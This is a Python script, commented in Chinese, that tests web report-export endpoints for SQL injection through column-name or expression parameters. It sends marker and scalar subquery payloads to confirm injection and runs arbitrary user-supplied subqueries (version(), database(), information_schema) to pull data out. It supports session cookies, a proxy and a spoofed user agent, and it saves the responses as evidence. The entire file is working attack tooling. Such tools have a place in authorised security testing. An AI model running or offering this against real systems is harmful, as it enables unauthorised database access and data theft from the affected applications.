#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""expr_probe.py —— 列名 / 表达式注入取证器（报表导出、GROUP BY / ORDER BY 列名）。

适用场景：导出接口的某个参数不是“值”，而是被直接拼进 SQL 的列名或表达式，例如
    /merchant/reports/export?from=...&to=...&dimension=category
把 category 换成 category' → 500；换成 (SELECT 1) → 导出第一列变成 1。
这类点用成对布尔探测（引号/AND 1=1）会全部 500，容易误判为“不可注入”。

本工具用 4 发请求给出结论：
    1. baseline：合法列名/表达式
    2. marker  ：(SELECT '<随机标记>')  —— 标记出现在响应里 = 表达式被执行
    3. scalar  ：(SELECT 1)            —— 200 且响应变化 = 标量子查询可用
    4. custom  ：--expr 指定的表达式（可重复），用于 version()/database()/information_schema 取数

Usage:
  python expr_probe.py --target "https://host/merchant/reports/export?from=2026-07-26&to=2026-10-23&dimension=*" \
      --base category --cookie "sid=..." --expr "(SELECT version())" --expr "(SELECT database())"

  POST 体：
  python expr_probe.py --target "https://host/report" --method POST \
      --data "from=2026-01-01&to=2026-12-31&dimension=*" --base category

Exit codes: 0 可注入, 1 未确认, 2 网络/限速中止, 3 参数错误。
"""
import argparse
import http.cookiejar
import json
import os
import random
import string
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

DEFAULT_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/126.0 Safari/537.36")
RATE_LIMIT_HINTS = ("过于频繁", "稍后再试", "too many requests", "rate limit",
                    "安全校验未通过", "try again later")


def _inject(template, value):
    if "*" not in template:
        raise ValueError("模板里必须有 * 标记")
    idx = template.index("*")
    return template[:idx] + value + template[idx + 1:]


def apply_url(template, value):
    parts = urllib.parse.urlsplit(template)
    pairs = urllib.parse.parse_qsl(parts.query, keep_blank_values=True)
    out = []
    for k, v in pairs:
        if "*" in k:
            k = _inject(k, value)
        if "*" in v:
            v = _inject(v, value)
        out.append((k, v))
    return urllib.parse.urlunsplit(
        (parts.scheme, parts.netloc, parts.path,
         urllib.parse.urlencode(out, quote_via=urllib.parse.quote), parts.fragment))


def apply_body(template, value):
    pairs = urllib.parse.parse_qsl(template, keep_blank_values=True)
    out = []
    for k, v in pairs:
        if "*" in k:
            k = _inject(k, value)
        if "*" in v:
            v = _inject(v, value)
        out.append((k, v))
    return urllib.parse.urlencode(out, quote_via=urllib.parse.quote)


def send(op, url, method, body, headers, timeout):
    req = urllib.request.Request(url, data=body.encode() if body is not None else None,
                                 headers=headers, method=method)
    try:
        with op.open(req, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


def _load_netscape_jar(path):
    """手动读 Netscape cookie jar。expires=0 按 session cookie 处理（不因过期被丢弃）。"""
    cj = http.cookiejar.CookieJar()
    with open(path, encoding="utf-8") as f:
        for line in f:
            if line.startswith("#HttpOnly_"):
                line = line[len("#HttpOnly_"):]
            elif line.startswith("#") or not line.strip():
                continue
            parts = line.rstrip("\n").split("\t")
            if len(parts) != 7:
                continue
            domain, inc, cpath, secure, _exp, name, value = parts
            c = http.cookiejar.Cookie(
                0, name, value, None, False, domain, False, False, cpath, True,
                secure.upper() == "TRUE", None, True, None, None, {"HttpOnly": None})
            cj.set_cookie(c)
    return cj


def preview(text, limit=180):
    flat = " ".join(text.split())
    return flat[:limit]


def looks_like_login(text):
    """302 被 urllib 跟随后，导出接口会返回登录页；必须先识别，避免把 CSRF 变化当成注入。"""
    head = text[:4000].lower()
    return ("<title>登录" in head) or ("welcome back" in head)


def first_data_row(text):
    """CSV 导出：返回第一条非空数据行的第一列；不是 CSV 返回 None。"""
    if "<html" in text[:200].lower() or "<!doctype" in text[:200].lower():
        return None
    lines = [l for l in text.splitlines() if l.strip()]
    if len(lines) < 2:
        return None
    return lines[1].split(",")[0].strip().strip('"')


def main():
    p = argparse.ArgumentParser(description="Expression/column injection probe for report exports")
    p.add_argument("--target", required=True, help="含 * 标记的地址")
    p.add_argument("--method", default="GET")
    p.add_argument("--data", default=None, help="POST 体，含 * 标记")
    p.add_argument("--base", default="category", help="基线列名/表达式，默认 category")
    p.add_argument("--expr", action="append", default=[], help="额外表达式，可重复，如 \"(SELECT version())\"")
    p.add_argument("--marker", default=None, help="随机标记（默认自动生成）")
    p.add_argument("--cookie", default=None, help="静态 Cookie 头；会话会轮换时请改用 --cookie-jar")
    p.add_argument("--cookie-jar", default=None, help="Netscape cookie jar；每发请求自动更新（推荐）")
    p.add_argument("--header", action="append", default=[])
    p.add_argument("--user-agent", default=DEFAULT_UA)
    p.add_argument("--proxy", default=None)
    p.add_argument("--timeout", type=float, default=30)
    p.add_argument("--gap", type=float, default=1.0)
    p.add_argument("--out", default="expr-evidence.json")
    p.add_argument("--out-dir", default="expr-raw")
    args = p.parse_args()

    if "*" not in args.target and (not args.data or "*" not in args.data):
        print("REFUSED: target 或 data 里必须有 * 标记")
        return 3

    marker = args.marker or ("NEXA" + "".join(random.choice(string.ascii_uppercase + string.digits)
                                              for _ in range(8)))
    handlers = [urllib.request.ProxyHandler({"http": args.proxy, "https": args.proxy})] \
        if args.proxy else [urllib.request.ProxyHandler({})]
    jar = None
    if args.cookie_jar:
        jar = _load_netscape_jar(args.cookie_jar)
        handlers.append(urllib.request.HTTPCookieProcessor(jar))
    op = urllib.request.build_opener(*handlers)
    headers = {"User-Agent": args.user_agent, "Accept-Encoding": "identity"}
    if args.cookie:
        headers["Cookie"] = args.cookie
    for h in args.header:
        if ":" in h:
            k, v = h.split(":", 1)
            headers[k.strip()] = v.strip()
    if args.data:
        headers.setdefault("Content-Type", "application/x-www-form-urlencoded")

    out_dir = os.path.abspath(args.out_dir)
    os.makedirs(out_dir, exist_ok=True)
    evidence = {"target": args.target, "method": args.method, "base": args.base,
                "marker": marker, "started_at": time.strftime("%Y-%m-%d %H:%M:%S"),
                "probes": []}

    def probe(tag, expr):
        url = apply_url(args.target, expr) if "*" in args.target else args.target
        body = apply_body(args.data, expr) if args.data and "*" in args.data else args.data
        st, text = send(op, url, args.method.upper(), body, headers, args.timeout)
        limited = st == 429 or any(h in text.lower() for h in RATE_LIMIT_HINTS)
        raw_path = os.path.join(out_dir, "%s.txt" % tag)
        with open(raw_path, "w", encoding="utf-8") as f:
            f.write("URL: %s\n\nEXPR: %s\n\n" % (url, expr))
            if body:
                f.write("BODY: %s\n\n" % body)
            f.write(text)
        hit = marker in text
        evidence["probes"].append({"tag": tag, "expr": expr, "url": url, "status": st,
                                    "len": len(text), "marker": hit,
                                    "rate_limited": limited, "raw": raw_path})
        print("[%-10s] status=%-4s len=%-6d marker=%-5s %s" %
              (tag, st, len(text), hit, preview(text, 140)))
        return st, text, hit, limited

    print("=== 表达式注入取证：%s（基线 %s，标记 %s）===" % (args.target, args.base, marker))
    st, base_text, _, limited = probe("baseline", args.base)
    if limited:
        print("限速中，停止。")
        evidence["verdict"] = "rate_limited"
        _save(evidence, args.out)
        return 2
    if st == 200 and looks_like_login(base_text):
        print("基线像登录页：Cookie 失效或未带会话，先重新登录再跑。停止。")
        evidence["verdict"] = "login_required"
        _save(evidence, args.out)
        return 1
    time.sleep(args.gap)

    st_m, text_m, hit_m, limited = probe("marker", "(SELECT '%s')" % marker)
    if limited:
        evidence["verdict"] = "rate_limited"
        _save(evidence, args.out)
        return 2
    time.sleep(args.gap)

    st_s, text_s, hit_s, limited = probe("scalar", "(SELECT 1)")
    if limited:
        evidence["verdict"] = "rate_limited"
        _save(evidence, args.out)
        return 2

    verdict = "not_confirmed"
    if st_m == 200 and hit_m:
        verdict = "INJECTABLE_EXPR"
    elif st_s == 200 and first_data_row(text_s) == "1":
        verdict = "INJECTABLE_SCALAR"

    for i, expr in enumerate(args.expr, 1):
        time.sleep(args.gap)
        st_c, text_c, hit_c, limited = probe("custom%d" % i, expr)
        if limited:
            evidence["verdict"] = "rate_limited"
            _save(evidence, args.out)
            return 2

    evidence["verdict"] = verdict
    _save(evidence, args.out)
    print("\n=== 判定：%s ===" % verdict)
    print("证据: %s（原始响应在 %s/）" % (os.path.abspath(args.out), out_dir))
    return 0 if verdict in ("INJECTABLE_EXPR", "INJECTABLE_SCALAR", "LIKELY_EXPR") else 1


def _save(evidence, out):
    with open(os.path.abspath(out), "w", encoding="utf-8") as f:
        json.dump(evidence, f, ensure_ascii=False, indent=2)


if __name__ == "__main__":
    sys.exit(main())
